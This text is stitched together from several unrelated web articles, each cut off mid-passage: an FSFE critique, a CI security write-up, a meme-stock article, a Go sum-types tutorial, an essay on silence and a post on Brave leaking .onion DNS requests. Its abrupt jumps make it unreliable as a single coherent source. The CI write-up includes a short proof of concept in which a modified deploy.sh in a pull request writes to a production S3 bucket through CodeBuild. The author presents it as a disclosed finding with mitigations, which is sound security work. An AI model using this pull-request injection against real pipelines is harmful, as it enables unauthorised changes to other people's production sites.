<p>But I also have been a Free Software developer and advocate for a long time. I believe in the need for more Free Software, and I agree that government-developed software should be released to the public, even if it doesn’t benefit directly the taxpayers of the government that developed it. I made <a href="https://flameeyes.blog/2009/07/15/pubbliche-amministrazioni-e-software-libero-un-caso-pratico/">that case in Italian</a> over ten years ago (I should possibly translate that blog post or at least re-tell the tale). I would enjoy being an activist for an organization that cares about Free Software, but also cares to get more people onboard rather than fewer, and would rather then not build “purity tests” into its role.</p>



<p>Another <em>big</em> problem is with the engagement method. Because of the abovementioned purity test, FSFE appears to only be engaging with its community in a “write only” media over Twitter. If you want to be an activist for FSFE you need to use email and mailing list, or maybe you can use Mastodon. In-person meetings seemed to still be all the rage when I discussed this a few years ago, and I do wonder if with 2020 happening they manage to switch at least to Jitsi, or if they ended up just using an Asterisk server connected to a number of landlines to call into.</p>



<p>I’m still partially comfortable with mailing lists for discussion, but it’s honestly not much of a stretch to see how this particular communication medium is not favorable to younger people. It’s not just the lack of emoji and GIF reactions — it’s also a long-form medium, where you need to think careful about all the words you use, and that persists over time. And that counts double when you have to handle discussion with an organization that appears to have more lawyers than developers.</p>



<p>I joked on Twitter that for a Gen-Z person, asking to use email to partecipate is the equivalent of asking a Millennial (like me) to make a phone call. And I say that knowing full well how much time I used to spend on the phone when I ran my own company: it’s not fun to me at all.</p>



<p>But that means you’re cutting out two big categories of people who <em>could</em> have both the intentions and the means to help: younger people with time on their hand, who can actively partecipate in programs and organization, and professionals who might have the <a href="https://flameeyes.blog/2020/12/15/senior-engineering-open-the-door-move-away/">expertise</a> and the contacts.</p>



<p>And speaking of the professionals — you may remember that I came to the REUSE tool (which I contributed a number of fixes to myself) after complaining about having a <a href="https://flameeyes.blog/2020/04/16/making-it-easy-to-contribute-code/">hard time contributing while at Google</a> because projects, among others, often didn’t provide a proper license that I could refer to, to submit patches. At the time of writing, just like a few years ago when I first tried correcting something on the website, the <a href="https://git.fsfe.org/FSFE/fsfe-website">FSFE Website repository</a> does <strong>not</strong> provide a license or SPDX headers (to comply with REUSE).</p>



<p>What would I like is for an <em>actual</em> European-wide organization, focused not on government policy, but rather on making it possible to have a sustainable ecosystem of Free Software development, particularly when it comes to all of those nuances that differ from a discussion of Free Software and licensing that is always too USA-centric.</p>



<p>The organization I have in mind, that I would <em>love</em> to provide monetary contribution to (if not outright be an activist for, time constraint being a thing), would be spending time in universities and high school, showing the usefulness of Free Software to learn new things. Convincing both professors and students of the usefulness of sharing and receiving, and <em>respecting the licensing</em>.</p>



<p>This is not as obvious: back when I was in high school, <a href="https://en.wikipedia.org/wiki/BSA_(The_Software_Alliance)">BSA</a> was the only enforcement of license compliance in schools, and Free Software advocates were explicitly undermining those efforts, as they were working for a few proprietary software manufacturers. But as I <a href="https://flameeyes.blog/2009/09/23/who-pays-the-price-of-pirated-programs/">said before</a>, undermining proprietary software licenses undermines the Free Software movement. If people are trained to ignore licensing requirements, they are going to do so for Free Software, and that’s now you end up with projects ignoring the limits of GPL and other licenses.</p>



<p>And this connects to the next problem: for the movement to be sustainable, you also need people to <a href="https://flameeyes.blog/2010/04/09/making-money-with-free-software-development/">make a living off it</a>, and that requires <a href="https://flameeyes.blog/2010/07/11/a-personal-experience-on-why-the-floss-movement-cripples-itself/">taking licensing seriously</a>. It’s a topic I come back over and over: <a href="https://flameeyes.blog/2018/05/04/case-study-the-pizzeria-crm/">business-oriented Free Software is already lacking</a>, and people need money to survive. When the option for more experience developers, project managers, community managers, … is basically to barely make ends meet or go work for one of the big companies that <em>don’t</em> focus on Free Software… well the answer is obvious for a lot more people you may imagine. Not everyone gets to be the “star” that Greg KH or Linus Torvalds are, and get paid to pretty much keep their Free Software engagement — most others either do it as a side hustle, or <em>have</em> a side hustle.</p>



<p>The Document Foundation <a href="https://blog.documentfoundation.org/blog/2020/07/20/update-on-marketing-and-communication-plans-for-the-libreoffice-7-x-series/">found out the hard way</a> that there’s need for actual business plans if you want to keep maintaining big, complex Free Software projects. And even Mozilla, once shown as a core pillar of Free Software paid development, has shown this year how hard it is to keep “running the show” without a sustainable plan on the long term.</p>



<p>An organization focused on sustainability in Free Software should, at least in my hopes, focus on providing this kind of support. Providing blueprints for business engagements, providing outreach on license …</p></div></div>

<p>While developers have a keen nose for <a href="https://en.wikipedia.org/wiki/Code_smell">code smells</a> us operations types have a keen nose for infrastructure smells. When I opened this git repository for first time it hit me. A <code>buildspec.yml</code> file.</p>
<h3 id="the-humble-buildspecyml">The humble <code>buildspec.yml</code></h3>
<p>For those unfamiliar, <code>buildspec.yml</code> is used by a service called <a href="https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html">CodeBuild</a> and basically defines the steps used to build a project, including running shell commands. It’s basically remote code execution as a service.</p>
<p>The presence of this file in a repository isn’t call for alarm, but when it’s in a public repository it certainly raises red flags. The usual concern is someones committed some secret credentials into this file. In this case the file was clean of credentials.</p>
<p>All good right? Not so fast.</p>

<h3 id="notices-your-deploysh"><em>notices your <code>deploy.sh</code></em></h3>
<p>The <code>buildspec.yml</code> referenced a <code>deploy.sh</code>. This is when I verbally said “oh no”. Like before no secrets committed. A good start. <code>deploy.sh</code> contains instructions to deploy out the project - like <code>aws s3 sync</code> and the like, so we can determine that when this gets run it has access to upload to the production site.</p>

<p>The issue here is that the <code>buildspec.yml</code> and <code>deploy.sh</code> could be modified by a malicious user.</p>
<h3 id="the-pull-request">The pull request</h3>
<p>However malicious user doesn’t have access to commit to the repository and an admin isn’t going to merge malicious code, so this is no big deal right? Let’s see what happens when we lodge a pull request.</p>
<p>Upon creation of the pull request GitHub triggers a CodeBuild job. This is a fairly common practice to make sure nothing in the pull request breaks the build. What prevents the pull request build from deploying to production? Lets check <code>deploy.sh</code></p>
<div><pre><code data-lang="sh"><span>if</span> <span>[[</span> <span>"</span>$CODEBUILD_WEBHOOK_HEAD_REF<span>"</span> <span>==</span> <span>"refs/heads/main"</span> <span>&amp;&amp;</span> <span>${</span>CODEBUILD_SOURCE_VERSION:0:3<span>}</span> !<span>=</span> <span>"pr/"</span> <span>]]</span>; <span>then</span>
</code></pre></div><p>oh no.</p>
<p>So deployment is purely controlled by a script that can be changed in the pull request.</p>

<h3 id="one-last-chance">One last chance</h3>
<p>At this stage we’ve got remote code execution into the pipeline. Apart from <a href="https://www.vice.com/en/article/nzkxgm/bitcoin-mining-github-open-source-bots">mining some Bitcoin</a> this is pretty uneventful. What about the S3 sync we mentioned earlier? It’s possible that the role granted for pull requests is the same role used for deploying to production, so lets check it out.</p>
<p>I edited the shell script to have my code right at the start …</p>
<div><pre><code data-lang="sh">echo <span>"testing a security issue"</span> &gt; test.html
aws s3 cp test.html s3://target_bucket/test.html
aws cloudfront create-invalidation --distribution-id $CLOUDFRONT_DIST_ID --paths <span>"/*"</span>
exit <span>1</span>
</code></pre></div><blockquote>
<p><code>target_bucket</code> value was recovered from original <code>deploy.sh</code></p>
</blockquote>
<p>… and lodged a pull request. I checked the website and sure enough my file was there. 😮</p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/nathan-anderson-XHK0JdmJxJc-unsplash.jpg" alt="Fox licking lips"></p>
<blockquote>
<p>📸 Nathan Anderson via unsplash</p>
</blockquote>
<h3 id="it-doesnt-end-there">It doesn’t end there</h3>
<p>It’s quite possible that the role used for deployment might have access to lots of interesting things, a private subnet, IAM admin, CloudFormation. I didn’t check further than this and submitted a disclosure reported to the security team immediately.</p>
<h3 id="prevention">Prevention</h3>
<p>If you still want pull requests to trigger builds on a public repository there a couple of things you can do to limit risk.</p>
<p>Place build scripts in a separate repo. Some build tools let you specify a separate repo to use for the build pipeline. Be careful though as this doesn’t guarantee that the project build can’t execute commands, depending on the programming language and build tools.</p>
<p>For services like CodeBuild you can utilize a separate IAM role for pull requests which is limited to just build requirements. Make sure the build agents for PRs aren’t within a a trusted network.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3575"> <p>Meme stocks – the pincushion point where viral marketing merges with Wall Street – is creating a buzz of its own among investors across the board in 2021. Legions of retail traders, many of them young people fortified by zero commission trades and easy access to markets, are testing the limits of traditional equity trading structures as they seek quick scores via trading patterns based on viral marketing.</p><p>Some market watchers, including the regulators paid to ensure fair trading markets, see the creation of a potential monster in the elevation of meme stocks like GameStop (GME), AMC Entertainment (AMC), and Blackberry (BB), among other brand name stocks. That sentiment hasn’t dissuaded digital trading enthusiasts, and millions of investors have flocked to meme stocks.</p><div id=""><p><strong>Case in point:</strong> A new study by <a href="https://theharrispoll.com/viral-stocks-gamestop/" target="_blank" rel="noreferrer noopener">The Harris Poll</a> reported that over 25% of U.S. investors said they purchased at least one or more viral stocks since the start of the new year.</p></div><h2>Spot the Trends</h2><p>The Harris survey helps clarify the meme stock narrative among investors, with these trends at the top of the survey’s list:</p><ul><li><strong>Younger men dominate</strong>. Demographically, younger men were most likely to buy meme stocks, with 40% of those ages 18-44 and 40% of men buying shares, compared to 17% of those 45-plus investors and 16% of women.</li><li><strong>Investments are typically small</strong>. Investors seem to be reluctant to steer too much money into meme stocks. Harris noted that about 50% half of meme investors who purchased viral stocks in January kept their total investments in viral stocks “relatively small.” 53% of those investors invested $250 or less in viral stocks. Only 15% invested more than $1,000.</li><li><strong>Trades are short term</strong>. Most meme stock investors are only in it for the short-term. “Of those who bought GameStop stock this past January, 56% also sold shares in January,” Harris reported. “Of those who still have remaining shares, a third (34%) plan to hold their position for less than a month.”</li><li><strong>Social media and internet forums</strong> are the main drivers of viral stocks. The Harris survey tags social media (35%) as the leading viral stock meeting place, with Twitter a particular hot spot. Viral stock traders favor digital trading forums (32%) like Reddit’s <a href="https://www.reddit.com/r/wallstreetbets/" target="_blank" rel="noreferrer noopener">r/wallstreetbets</a> forum while traditional news media (31%) follow as the “top three” influences for meme stock buyers. (At the bottom of that market influencer’s list were financial advisors – only 20% of meme stock buyers purchased a viral stock on the advice of a financial advisor.)</li><li><strong>Research is out of style</strong>. Meme investors aren’t as interested in doing the due diligence necessary to make stock market decisions. “Despite the national buzz around viral stocks and the broader stock market, only a third of Americans (36%) have been interested enough to study how the U.S. financial system (e.g., banks, insurance companies, stock exchanges) and markets (e.g., primary markets/IPOs, secondary markets/stock markets) work”.</li></ul><p>Motivations for purchasing meme stocks vary. Many investors active on social media say that they aren’t interested in gains and merely wish to participate in a short squeeze targeting hedge funds. Others expect to earn a quick profit from volatile stocks. What both have in common is the use of modern trading technology and reliance on social media for communication with other traders.</p><h2><strong>Trading Technology That Fits the Younger Lifestyle</strong></h2><div><p>As the Harris study shows, younger investors are increasingly viewing stock trading as a natural extension of their digital lifestyles.</p></div><p>A major <a href="https://static1.squarespace.com/static/5edeedaed417cb4da8b5864a/t/600fabd7798adf0f9c20e9be/1611639767955/%5BHCCG%5D+Consumer+Finance+Report.pdf" target="_blank" rel="noreferrer noopener">study on consumer finance</a> issues released by Harvard College Consulting Group in January 2021, describes how digital technology has fueled interest in stock market trading among younger Americans – and has created the no-commission trades and fractional shares trading landscape that fits the lifestyle of younger investors.</p><p>“Over the past ten years, the emergence of new consumer finance technologies and businesses, such as digital-first banks, cryptocurrencies, online stock trading apps, micro-investing apps, and more, have revolutionized the consumer finance industry and enticed growing numbers of young people,” the report stated. “Plus, the prevalence of mobile banking solutions is only growing, as a Morgan Stanley survey of 6,000 consumers aged 16 to 34 in 2018 found that 47% of 16- to 17-year-olds and 71% of 18- to 19-year-olds use mobile apps to help manage their money.”</p><h3>Apps Make it Easy</h3><p>The study also noted that while younger Americans were only “moderately comfortable” with the stock market, the pervasiveness and low cost of mobile financial apps used by many younger investors made that trading experience easier and more cost-efficient.</p><p>“Mobile apps which had zero-commission trading and fractional-share trading, such as Robinhood, took the stock investment space by storm in 2013,” the Harvard report stated. “Robinhood had 500,000 users in its first year, and the company now reports 13 million users and over $180 million in revenue. In order to compete, companies like Charles Schwab, TD Ameritrade, Ally Invest, and Fidelity have dropped their electronic transfer fees to zero, lowering barriers to entry and making the cost much less of an obstacle to investment, especially for younger generations.”</p><p>According to the survey, <strong>Robinhood</strong> was the most widely-used investment platform with 19% of respondents having used it, followed by <strong>Fidelity Investments</strong> and <strong>TD Ameritrade</strong>. “When asked about important factors considered in their choice of investment platforms, zero-commission stock trading and fractional shares ranked as the most important factors among Gen Z respondents, 55% of whom already trading stocks.”</p><h2><strong>More Questions Than Answers on Meme Stocks</strong></h2><p>While meme stocks remain in the headlines and at the forefront of investor sentiment in early 2021, a larger question remains for investors who rely on hype rather than fundamentals to drive stock buying decisions.</p><div><p>Can investors really count on meme stocks as stable portfolio contributors, especially given the sources of information that push meme stocks to the front of the investment trading culture?</p></div><div><p>“There’s good and bad elements tied to viral stocks” said Asher Rogovy, chief investment officer at <a href="https://www.magnifina.com/" target="_blank" rel="noreferrer noopener">Magnifina</a>, a New York City-based money management firm. “For instance, because interest rates are so low, there are fewer compelling investments. A meme stock might act as a de facto store of value so long as its forward-looking valuation is somewhat plausible. Yet mis-valued stocks might correct sharply if rising interest rates pop speculative bubbles.”</p><p>Pulling the lens back further, Rogovy believes it’s “foolish” to trust anonymous posts on the internet.</p></div><p>“Fraudsters may be emboldened to make false claims on anonymous internet forums,” Rogovy said. “I never fully trust any information that doesn’t come with a face and a name. On WallStreetBets, I have seen considerable amounts of demonstrably false information being posted and repeated.”</p><p>Rogovy’s quote illustrates one of the risks of the meme stock movement. Emotional drivers like the desire to squeeze a hedge fund can deliver non-financial rewards to some participants. They can also bring very real financial gains to stockholder who sell into the frenzy. That creates potential for manipulation, and where that potential exists, it will be exploited.</p><h2><strong>A Repeat of the Wild 1990’s?</strong></h2><p>Rogovy also believes the recent activity arising from WallStreetBets mirrors the late 1990’s, when independent online trading first became widespread and message boards like <em>Silicon Investor</em> and <em>Raging Bull</em> became the preferred vehicles for both information and misinformation.</p><p>“It’s just happening to a different generation,” he added. “Much of the misinformation about short squeezes has already been spread in similar events.”</p><p>Yet there are major distinctions between the late-’90s tech stock boom and today’s meme stock surge, and it’s not good news for retail investors.</p><p>“Unlike the 1990s, today’s retail millennial investor does not invest with the same sort of optimism and “irrational exuberance” that characterized the investing behavior of his or her parents’ generation,” said Demetri Kofinas, a long-time trader and host of the <a href="https://hiddenforces.io/" target="_blank" rel="noreferrer noopener">Hidden Forces podcast</a>. “People buying high-flying internet stocks in the late 90’s really did believe that they were living in a “new paradigm economy” and that they were jumping on a train of transformation that was going to leave the legacy economy in the dust.”</p><p>Kofinas believes that late 1990’s investors believed they were investing in the future.</p><div><p>“Today’s millennial investor pouring money into Tesla (TSLA) or Uber (UBER) does share some of that exuberance, but this type of optimism is not a market-wide phenomenon, like it was in the 1990’s,” he said.</p></div><h2><strong>Optimal Conditions for Meme Investors</strong></h2><p>The emergence of the younger investor who is more likely to pursue viral stocks is hardly an accident. It’s the end result of dominant technology combining with a global pandemic that kept people at home and looking for online distractions. It’s up to the masses to entertain themselves during lockdown, and the Reddit-inspired investment army figured they might as well try to make a buck or two – or maybe take a whack at a short-selling hedge fund – in the process.</p><p>“The emergence of the retail investor, along with stimulus checks and extra time to work from home, is creating a breeding ground for pump and dump stocks,” said George Papazov, founder of TRADEPRO Academy, a platform that helps at-home traders and investors achieve liftoff.</p><p>While the newest generation of young traders possess its fair share of exuberance, it’s courting danger as so many younger investors have yet to grasp the downside of focusing on viral stocks.</p><h3>Brains and Bulls</h3><p>“There is a saying among veteran traders that says, “<em>don’t confuse brains for bulls</em>”, Papazov said. “When markets are moving higher at breakneck speed, due to money printing by the Fed and the inflation of paper assets, you can buy just about any stock and make money. But …</p></article></div>

<p><nobr>posted Jun 02, 2013</nobr><br>
in <a href="http://www.jerf.org/iri/categories/Programming/">Programming</a>, <a href="http://www.jerf.org/iri/categories/Golang/">Golang</a>, <a href="http://www.jerf.org/iri/categories/Haskell/">Haskell</a></p>






<p>A couple of months back, I analyzed whether I wanted to propose switching to Go for work. I've still technically got the blog post with the results of that analysis in the pipeline (though who knows when I'll get it up), but there's a part of it that keeps coming up online, and I want to get this bit out faster. It's about whether <a href="http://golang.org/">Go</a> has "sum types".</p>
<hr>

<p>A sum type is a type in a language that can have multiple different kinds of values, which themselves may contain values of differing types.</p>

<p>To put it in C terms, it is a "union" in a struct with an element that says which member of the union is currently the active element. In fact the <a href="https://en.wikipedia.org/wiki/Tagged_union">Wikipedia page on the topic</a> lumps the two together. Different elements of the union may have significantly different memory sizes, so languages that make heavy use of this will not use a literal C union, but this gets the idea across.</p>

<p> A classic example is an AST type that defines what a legal abstract syntax tree expression is, pulled from the <a href="http://en.wikibooks.org/wiki/Haskell/GADT">Haskell GADT Wikibook page</a>:</p>

<pre>data Expr a where
   I   :: Int  -&gt; Expr Int
   B   :: Bool -&gt; Expr Bool
   Add :: Expr Int -&gt; Expr Int -&gt; Expr Int
   Mul :: Expr Int -&gt; Expr Int -&gt; Expr Int
   Eq  :: Expr Int -&gt; Expr Int -&gt; Expr Bool</pre>

<p>This says that an expression may be an <tt>I</tt> for Int type, which then contains an Int value, or it may be a <tt>B</tt> that contains a Bool, or it may be an <tt>Add</tt> or <tt>Mul</tt> expression which itself may contain some expression of type Int, or an <tt>Eq</tt> expression. This is all recursive, so <tt>Mul (Add (I 3) (I 4)) (I 5)</tt>, the translation of <tt>(3 + 4) * 5</tt> in traditional infix syntax, is legal.</p>

<p>Good languages support making it impossible to confuse the elements, so you have to "deconstruct" the sum type to do anything with it. Generally associated with a type like this you'll see a base set of functions that run the type through a case statement. Using the above, we can evaluate the expression with:</p>

<pre>eval :: Expr a -&gt; a
eval expr = case expr of
                (I n) -&gt; n
                (B b) -&gt; b
                (Add e1 e2) -&gt; eval e1 + eval e2
                (Mul e1 e2) -&gt; eval e1 * eval e2
                (Eq  e1 e2) -&gt; eval e1 == eval e2</pre>

<p>(I transformed the original into a case statement, for better parallels with Go.)</p>

<p>Sum types are a great example of how learning a different language can expand your mind. If you've never used a language with good support for sum types, they sound worthless; after all, you've made it this far without ever needing explicit support, and you can bodge together something that works if you ever need to. But once you've become fluent in a language that heavily uses them, you'll never stop seeing places where you need them, and you'll miss them badly. Two places where sum types are particularly strong are the aforementioned AST example, and any sort of protocol, where a sum type can easily represent the legal messages that can be received, while excluding by construction any message that can not be received. When this is done, the type system itself helps you correctly handle errors at the outermost level, then pass the messages along to an inner layer that need no longer worry about such basic error handling. It's a good idea anyhow, and having the type system help enforce it is even better.</p>

<p>AST types are presumably forever going to be a marginal case in Go. Nothing stops you from writing a compiler in Go, but it will never be a dominant use case for the language. Protocols, on the other hand, appear <i>everywhere</i>; every <tt>chan</tt> in Go defines a protocol. Often they are quite simple (<tt>chan bool</tt> can only be so complicated), but they can't all be that simple. A serious Go program will be steeped in protocols internally.</p>

<p>But, alas, as is well known, Go does not contain union types. Except, as the <a href="http://golang.org/doc/faq#variant_types">FAQ entry alludes to</a>, it sort of already does. But the FAQ is a faint allusion, and my Googling can't find anyone demonstrating what I consider the correct way (you can do <i>much</i> better than <tt>interface{}</tt>, which seems to be the current <i>de facto</i> standard), so let me show it to you. Let's translate that Expression type into Go.</p>

<pre>package main

import "fmt"

// Rather than a "type", we declare an "interface" for the type
type Expr interface {
	isExpr()
}

// We can't define an implementation of isExpr on int directly, so
// we wrap it
type I int

// And tag it as an "Expr". This function's only point is to do that.
func (i I) isExpr() {}

// And so on:
type B bool
func (b B) isExpr() {}

type Add struct { left Expr; right Expr }
func (a Add) isExpr() {}

type Mul struct { left Expr; right Expr }
func (m Mul) isExpr() {}

type Eq struct { left Expr; right Expr }
func (e Eq) isExpr() {}

func eval (e Expr) (r Expr) {
    switch exp := e.(type) {
        case I: r = exp
        case B: r = exp
        case Add: r = I(eval(exp.left).(I) + eval(exp.right).(I))
        case Mul: r = I(eval(exp.left).(I) * eval(exp.right).(I))
        case Eq: r = B(eval(exp.left).(I) == eval(exp.right).(I))
    }
    return
}

func main () {
    fmt.Println("4 + 5: ", eval(Add{I(4), I(5)}))
    fmt.Println("(3 + 2) * 2: ", eval(Mul{Add{I(3), I(2)}, I(2)}))
    // you'll never see this output:
    fmt.Println("Runtime error: ", eval(Add{I(3), B(true)}))
}</pre>

<p>You can try that on the <a href="http://play.golang.org/p/sBrG1UfWs4">Go Playground</a>, or if that is ever removed, paste that into a file and run with "go run". (I deliberately condensed the code for blog-readability, hit "Format" on the playground if you want to see the official formatting.)</p>

<p>There are a couple of differences in the translation. eval can not return either a "true" int or a "true" bool (that is, values of the literal Go types <tt>int</tt> or <tt>bool</tt>), so we write it to return an <tt>Expr</tt> unconditionally. We've lost some type safety; Haskell would refuse to compile the third sample output, but Go does, and the type system doesn't prevent <tt>eval</tt> from returning an <tt>Add</tt>, so if we wish to verify that, we must do it by inspection. This is Go's <i>modus operandi</i>, though, so <i>shrug</i>. We do still have <i>some</i> type safety. You can't construct an <tt>Expr</tt> that is not one of those five things, nor can you accidentally stuff a String anywhere in there, as that will be caught at compile time, nor can you fail to unpack the <tt>I</tt> or <tt>B</tt> types out of the <tt>Expr</tt> before using them in most other code, which also turns out to be a very useful property. (It means you <i>must</i> explicitly unpack it, and handle any errors that occur at that time, immediately, which is good for writing robust code.) I say "most" because there are some implicit conversions, but it's much more sane and constrained than, say, Javascript.</p>

<p>If your interface declares a lower-case <tt>is*</tt> function, no users of your package will be able to add to your sum type. I don't think you'd ever want to use this technique with a public tag function, because interfaces themselves cover the use case of wanting something publicly extendable.</p>

<p>Of course, the tag interface is only used if you have no meaningful interface to define for your sum type. If you do have a real interface you can define you don't need a fake <tt>is*</tt> function, just define the interface. I have code that sends out an "Item" over a socket, where the Item is some component of the protocol in question (may be a list, hash, string, etc), and there's a real interface there, such as the function that takes the object and serializes it to an <tt>io.Writer</tt>, returns the size in bytes it will have, pretty-prints, etc. Using private names for the interface does ensure though that nobody else can accidentally create a new element in the protocol in another module. In concrete terms, if you <i>do</i> use an <tt>is*</tt> private method in your interface, as soon as you add any other private method you should just remove the <tt>is*</tt> one from the code.</p>

<p>Another example I found I was using a lot was defining the following five elements:</p>

<ul><li>An interface to declare a protocol type, with a private tag function.</li>
<li>All the messages that could be sent on that protocol as one type each, as private types.</li>
<li>An object that contained the data for the object, and a receiving control channel of the interface type defined above.</li>
<li>This object contained public methods corresponding to the messages that could be sent, which constructed the relevant structs, sent them on the control channel, and if there was to be a return value, handled creating the return channel and returning the resulting value. If the control channel can be closed, this should also handle that case.</li>
<li>A goroutine that consisted entirely of an endless <tt>for{}</tt> loop with a switch statement switching on the request coming in, and a defer statement that guarantees we close the control channel if this scope gets exited in any way. More sophisticated protocols could replace the switch with a state machine, though I never needed one.</li></ul>

<p>The end result of this is a goroutine acting as a server, providing easy, mediated access to whatever resource it was controlling, with an extremely easy-to-use external object for talking to it, which at the same time successfully sealing away the details of the <tt>chan</tt>'s protocol to the inside of the implementing module.</p>

<p>The downside of this approach is that it is awfully verbose for what it is accomplishing, and Go provides no mechanisms for factoring this pattern away. You must declare a tag interface, a type per message, an empty implementation of the tag interface per message, a method per message to send the command (themselves rather redundant, repeatedly copying the function params into a struct, creating the return channels, etc), and then a case statement per message type in the core implementation loop. That's a lot of repetitions of the phrase "per message". But it seemed to be a pretty solid pattern in Go, and this really is a great way to safely create a non-trivial protocol that is easy-to-use for using code.</p>

<p>(I've fiddled a bit with using the <tt>go</tt> language packages to auto-generate this sort of code. It should be possible, though I'm having some trouble with correctly …</p></div></div>

            <h3>Silence</h3>

            <p>
                Let's be honest, silence is not usually considered an exciting subject. Despite Depeche Mode's ironic effort to convince us, the idea that we should enjoy silence seems like a stretch. So why am I writing about it?
            </p>

            <p>
                The subject of silence interests me because it's so uncool, yet so powerful.
            </p>

            <p>
                Like everyone else, I tend to listen to music while working.
            </p>

            <p>
                I imagine you're picturing the stereotypical programmer sat in a dark corner with headphones on, but stereotypes don't help anyone. I often put a light on in order to illuminate a path (the shortest of which I've previously calculated) to crawl out from in order to locate nutrition-free food and return without talking to anybody as quickly as possible. Just beware of stereotypes is all I'm saying.
            </p>

            <p>
                For a long time I mostly ignored the feeling that music was affecting my attention and ability to focus. Music makes me feel good, and feeling good is good for productivity, so listening to music is productive, right? The math on that one sounds about right.
            </p>

            <p>
                I believed that for a while, but I've now changed my mind.
            </p>

            <p>
                There have been too many occasions where being in complete silence has shown me how much better I can focus. It's not just that the focus is easier to find, it's that it's deeper and easier to keep as well.
            </p>

            <p>
                When there's no music (or any other audible distraction), all of my senses are connected to the work I'm doing. The only thing affecting my heart rate, happiness, stress, emotions, etc. is the work itself and how I'm interacting with it. Just me and the work. Aside from keeping me alive, my energy is being spent nowhere else. My attention is going nowhere else.
            </p>

            <p>
                Well, unless I've left Slack open, in which case, probably best you don't do that.
            </p>

            <p>
                Once I started to think about it, it became clear that the reason music is so enjoyable is because it affects how we feel. It's a form of stimulation. It uses energy, causing responses in various parts of the brain such as the amygdala and hippocampus, which are responsible for memory and decision making.
            </p>

            <p>
                Music certainly can make us feel better while working, but is it a good trade? How much of the energy being used to enjoy the music could have been useful, even essential, for the work we're doing, had we chosen silence?
            </p>

            <p>
                It's not a simple question, especially when you consider that not all music is the same, not all work demands the same energy and focus, and not everyone wants to optimise for output – sometimes you just want a healthy balance between output and feeling good (if the work itself isn't providing the feels).
            </p>

            <p>
                Having experimented a lot more with working in silence recently, I've begun to acknowledge the evidence that in silence I simply work better. I don't always need to work better, but knowing how to pull that lever when I need to is a useful tool.
            </p>

            <p>
                While this is all just anecdotal, taken from my own experience, it feels like there's a simple truth somewhere in the idea that the less stuff you give your brain to respond to, the more energy and focus you have to use elsewhere.
            </p>

            <p>
                I've started to respect silence as the ideal, natural state for concentration, choosing to exchange it with music, a podcast, etc. very deliberately, rather than by telling myself it makes no difference. It makes too big of a difference to continue ignoring it.

                It's true that the word <i>silence</i> doesn't really evoke a sense of having an awesome time. For one, I can't listen to <del>Tina Turner</del>, uh, Drake, while writing code. But sometimes all of those Dake joules are better spent giving yourself the edge when it comes to producing your best work.
            </p>

            <p>
                Drake <del>might be</del> is awesome, but the satisfaction of losing yourself in deep work, the joy of being present and producing your best stuff... you ever tried that?
            </p>

            <p>That kind of euphoria is anything but silent.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div lang="en" dir="ltr"><p>Edit: (Since this is gaining traction elsewhere.) I'm not trying to shit on Brave. I'm just wanting to help protect end-users who may use Brave for it's Tor feature to do stuff over Tor that should only be done with the actual Tor browser. If you're using Brave you probably use it because you expect a certain level of privacy/anonymity. Piping .onion requests through DNS where your ISP or DNS provider can see that <em>you</em> made a request for an .onion site defeats that purpose.</p>
<p>I'm also no NetSec expert but you don't have to be to replicate this. I'm just a dude with some websites and projects and I'm not certain I would have taken notice of this if it wasn't reported to me by a partner on another project who witnessed this behavior when monitoring his local requests leaving his network. He'll be doing his own write-up and is more equipped to discuss this in length than me.</p>
<hr><p>Testing out something that was noted a week or so ago, and wanting to replicate it for the purpose of this post.</p>
<p>Some of you know I'm working on an ad, tracker, and other BS blocking VPN service for an unrelated project to this site. Go to <a href="https://ramble.pw/f/incoghost">/f/incoghost</a> (<a href="https://incog.host/" rel="nofollow">website</a>) for more because I try to keep these things separated.</p>
<p>Anyhow, it was reported by a partner that Brave was leaking DNS requests for onion sites and I was able to confirm it at the time. Decided to spin up a VM with Brave and test with this site's Onion service (though it will do this for any .onion)</p>
<p>Example:</p>
<pre><code> Feb 18 12:02:25: query[A] rambleeeqrhty6s5jgefdfdtc6tfgg4jj6svr4jpgk4wjtg3qshwbaad.onion from 104.244.xx.xxx
</code></pre>
<p>What this entry shows (simply) is that the request made for the domain rambleeeqrhty6s5jgefdfdtc6tfgg4jj6svr4jpgk4wjtg3qshwbaad.onion made it to the DNS server and is tagged with the IP of the requester, which in this case is just the test / dev VPN. This shouldn't happen. There isn't any reason for Brave to attempt to resolve a .onion domain through traditional means as it would with a regular clearnet site.</p>
<p>This is especially worrisome for those of you who use Brave browser from your normal residential IP and (for whatever reason) use the Tor feature built into the browser to access Tor sites. Your ISP or DNS provider <em>will</em> know that a request made to a specific Tor site was made by <em>your</em> IP. With Brave, your ISP would know that you accessed <em>somesketchyonionsite.onion</em> .</p>
<p>TL;DR: If you're going to use Tor, use the Tor Browser and not Brave. The Tor browser itself doesn't leak these requests like Brave does.</p>
<hr><p>Edit: To clarify, the VPN service we're working on is no-logging but during this dev and testing period we're logging DNS requests while we work out the kinks in the blocklists. This has also allowed us to witness .onions being passed through which is a fault of Brave.</p>
<hr><p>Edit 2: Screenshot: <a href="https://images2.imgbox.com/98/46/1i084PbC_o.png" rel="nofollow">https://images2.imgbox.com/98/46/1i084PbC_o.png</a></p>
<p>That was me loading duckduckgo in a different container, with brave, while live fetching DNS requests made to the DNS server. I blurred out the non-onion requests. (Different VPN test location than in the above example so 209.x.x.x IP instead of the 104.x.x.x one in the original example.</p>
<hr><h3>EDIT 2: The mods of /r/privacy won't let this be posted. They say:</h3>
<blockquote>
<p>While we (vastly) prefer the Tor Browser over the Brave one, you'll need a better source than the one you found. Can you find something from a more widely recognized NetSec expert? Something along the lines of Bruce Schneier's blog or something at that level of credibility?</p>
</blockquote>
<p>and</p>
<blockquote>
<p>The problem with screenshots is that they can be faked, trivially. There are also a host of approaches that credible writers/reporters do in the NetSec space do before a line of text appears in print. It's this kind of journalism that we have to trust, since we humble Mods don't have the time or resources to vet. So, we'll need something better sourced. Sorry!</p>
</blockquote>
<p>and</p>
<blockquote>
<p>There are new posts everyday "warning" people of things that aren't legitimate, hence the caution. This is not a "security" subreddit. A moderator's job is to ensure that the subreddit doesn't devolve into conspiracy theories and misinformation. Security announcements should be vetted and confirmed, not independent claims that the mods have no time to independently verify.</p>
<blockquote>
<p>I can post the steps on how to easily replicate this by using pi-hole on their local networks. Anyone is capable of verifying this.</p>
</blockquote>
